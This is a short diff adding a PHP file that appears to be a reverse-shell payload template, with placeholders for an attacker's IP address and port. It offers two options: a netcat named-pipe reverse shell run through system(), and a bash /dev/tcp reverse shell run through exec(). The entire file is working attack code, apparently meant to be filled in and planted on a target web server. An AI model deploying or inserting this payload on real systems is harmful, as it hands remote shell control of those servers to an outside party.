@@ -1,0 +1,7 @@
+<?php
+// option #1
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{.IPAddress}} {{.Port}} >/tmp/f');
+
+// option #2
+exec("/bin/bash -c 'bash -i >& /dev/tcp/"{{.IPAddress}}"/{{.Port}} 0>&1'");
+?>
